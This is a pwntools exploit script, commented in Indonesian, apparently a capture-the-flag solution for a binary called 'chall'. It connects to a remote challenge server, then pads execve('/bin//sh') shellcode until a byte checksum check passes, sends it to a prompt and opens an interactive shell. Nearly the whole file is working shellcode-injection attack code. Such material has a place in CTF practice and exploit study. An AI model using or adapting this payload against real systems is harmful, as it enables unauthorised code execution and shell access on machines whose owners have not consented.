#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.R:
        return remote('23.146.248.136',10023)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled

# ---------------- Helpers ----------------
def checksum(payload: bytes) -> int:
    """Sama persis dengan program: sum((i+1)*byte) mod 256."""
    s = 0
    for i, b in enumerate(payload):
        s = (s + (i + 1) * b) & 0xff
    return s

def build_payload(base_sc: bytes, max_len: int = 0x64) -> bytes:
    """
    Tambah 1–n byte padding aman sampai checksum != 255.
    Coba beberapa kandidat pad-byte kalau filter galak.
    """
    PAD_CANDIDATES = [
        0x90,       # NOP (kalau dilarang, kita lanjut)
        0x40,       # REX prefix (sering aman)
        0x66,       # operand-size prefix
        0x2e,       # CS: segment prefix
        0x48,       # REX.W
        0x31,       # XOR r/m32, r32 (kalau dieksekusi pun harmless di awal)
    ]

    p = bytearray(base_sc)
    if len(p) > max_len:
        raise ValueError("Shellcode terlalu panjang")

    # kalau sudah aman, langsung pakai
    if checksum(p) != 255:
        return bytes(p)

    # otherwise, append pad bytes
    for pad in PAD_CANDIDATES:
        q = bytearray(p)
        for _ in range(0, 16):  # cukup 16 percobaan
            if len(q) + 1 > max_len:
                break
            q.append(pad)
            if checksum(q) != 255:
                return bytes(q)

    raise RuntimeError("Gagal adjust checksum; coba ubah shellcode atau kandidat padding.")

# ---------------- Shellcode ----------------
# Null-free, ~23 bytes: execve("/bin//sh", 0, 0)
sc = asm("""
    xor     esi, esi          /* rsi = 0 */
    push    rsi               /* '\x00' terminator */
    mov     rdi, 0x68732f2f6e69622f
    push    rdi
    push    rsp
    pop     rdi               /* rdi -> "/bin//sh" */
    push    59
    pop     rax               /* rax = SYS_execve */
    cdq                        /* rdx = 0 */
    syscall
""")

payload = build_payload(sc, max_len=0x64)
log.info(f"len(payload)={len(payload)}, checksum={checksum(payload)}")


io = start()

# Sinkronisasi sedikit agar prompt tampil (optional, aman diabaikan kalau blocking)
io.recvuntil(b"Input your DNA sequence", drop=False)
# read() tidak butuh newline; kirim bytes mentah
io.send(payload)

io.interactive()

